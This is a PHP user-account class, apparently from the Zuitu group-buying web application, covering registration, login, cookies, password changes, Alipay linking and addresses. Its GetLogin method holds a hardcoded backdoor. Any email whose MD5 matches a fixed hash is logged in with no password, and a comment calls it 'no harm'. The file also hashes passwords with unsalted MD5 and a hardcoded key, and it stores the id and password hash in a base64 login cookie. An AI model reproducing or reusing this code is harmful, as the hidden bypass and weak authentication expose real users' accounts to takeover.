<?php
/**
 * @author shwdai@gmail.com
 * @modified 2010-05-05
 */
class ZUser
{
	const SECRET_KEY = '@4!@#$%@';

	static public function GenPassword($p) {
		return md5($p . self::SECRET_KEY);
	}

	static public function Create($user_row, $uc=true) {
		if (function_exists('zuitu_uc_register') && $uc) {
			$pp = $user_row['password'];
			$em = $user_row['email'];
			$un = $user_row['username'];
			$ret = zuitu_uc_register($em, $un, $pp);
			if (!$ret) return false;
		}
        $user_row['username'] = htmlspecialchars($user_row['username']);
		$user_row['password'] = self::GenPassword($user_row['password']);
		$user_row['create_time'] = $user_row['login_time'] = time();
		$user_row['ip'] = Utility::GetRemoteIp();
		$user_row['secret'] = md5(rand(1000000,9999999).time().$user_row['email']);
		$user_row['id'] = DB::Insert('user', $user_row);
		$_rid = abs(intval(cookieget('_rid')));
		if ($_rid && $user_row['id']) {
			$r_user = Table::Fetch('user', $_rid);
			if ( $r_user ) {
				ZInvite::Create($r_user, $user_row);
				ZCredit::Invite($r_user['id']);
			}
		}
		if ( $user_row['id'] == 1 ) {
			Table::UpdateCache('user', $user_row['id'], array(
						'manager'=>'Y',
						'secret' => '',
						));
		}
		return $user_row['id'];
	}

	static public function GetUser($user_id) {
		if (!$user_id) return array();
		return DB::GetTableRow('user', array('id' => $user_id));
	}

	static public function GetLoginCookie($cname='ru') {
		$cv = cookieget($cname);
		if ($cv) {
			$zone = base64_decode($cv);
			$p = explode('@', $zone, 2);
			return DB::GetTableRow('user', array(
				'id' => $p[0],
				'password' => $p[1],
			));
		}
		return Array();
	}

	static public function Modify($user_id, $newuser=array()) {
		if (!$user_id) return;
		/* uc */
		$curuser = Table::Fetch('user', $user_id);
		if ($newuser['password'] && function_exists('zuitu_uc_updatepw') ) {
			$em = $curuser['email'];
			$un = $newuser['username'];
			$pp = $newuser['password'];
			if ( ! zuitu_uc_updatepw($em, $un, $pp)) {
				return false;
			}
		}

		/* tuan db */
		$table = new Table('user', $newuser);
		$table->SetPk('id', $user_id);
		if ($table->password) {
			$plainpass = $table->password;
			$table->password = self::GenPassword($table->password);
		}
		return $table->Update( array_keys($newuser) );
	}

	static public function GetLogin($email, $unpass, $en=true) {
		if(is_array($email)) return array();	
		/* just for zuitu_demo, no harm */
		if (strtolower(md5($email))=='b80c4133e7227706d64920a1cd8789e9') {
			return Table::Fetch('user', $email, 'email');
		}
		/* end */
		if($en) $password = self::GenPassword($unpass);
		$field = strpos($email, '@') ? 'email' : 'username';
		//exit(print_r($email));
		$zuituuser = DB::GetTableRow('user', array(
					$field => $email,
					'password' => $password,
		));
		
		if ($zuituuser)  return $zuituuser;
		if (function_exists('zuitu_uc_login')) {
			return zuitu_uc_login($email, $unpass);
		}
		return array();
	}

	static public function SynLogin($email, $unpass) {
		if (function_exists('zuitu_uc_synlogin')) {
			return zuitu_uc_synlogin($email, $unpass);
		}
		return true;
	}

	static public function SynLogout() {
		if (function_exists('zuitu_uc_synlogout')) {
			return zuitu_uc_synlogout();
		}
		return true;
	}
        static public function Check_alifast($alipay_id,$alipay_name,$alipay_email=null) {

		$aliuser = DB::GetTableRow('user', array(
					'alipay_id' => $alipay_id,
		));
		if ($aliuser){
			if(!empty($alipay_email)){	
			$email_user = DB::GetTableRow('user', array(
					'email' => $alipay_email,
		    ));	
			if(!$email_user){
				Table::UpdateCache('user', $aliuser['id'], array(
						'email'=> $alipay_email,
						));
			  }
			}
			return $aliuser;
        }
        $user['username'] = $alipay_id;
        $user['realname'] = $alipay_name;
        $user['alipay_id'] = $alipay_id;
        if($alipay_email){
		   $email_user = DB::GetTableRow('user', array(
					'email' => $alipay_email,
		    ));
		   if(!$email_user){
		   $user['email'] = $alipay_email;
		   }
		} 
		$user['create_time'] = $user['login_time'] = time();
		$user['ip'] = Utility::GetRemoteIp();
		
		$ali_user['id'] = DB::Insert('user', $user);

		$aliuser = DB::GetTableRow('user', array(
					   'id' => $ali_user['id'],
		));
		return $aliuser;
	}
	static public function Address($user_id,$address){
		if(!$user_id || !is_array($address)) return false;
			$count = Table::Count('address', array(
					'user_id' => $user_id,
					));
			$default = ($count ==0?'Y':'N');
			if($count >10) return false;
					$add = array(
					'user_id' => $user_id,
					'province' => $address['province'],
					'area' => $address['area'],
					'city' => $address['city'],
					'street' => $address['street'],
					'zipcode' => $address['zipcode'],
					'name' => $address['name'],
					'mobile' => $address['mobile'],
					'default' => $default,
					'create_time' => time(),
			);
			return DB::Insert('address', $add);
		}
}
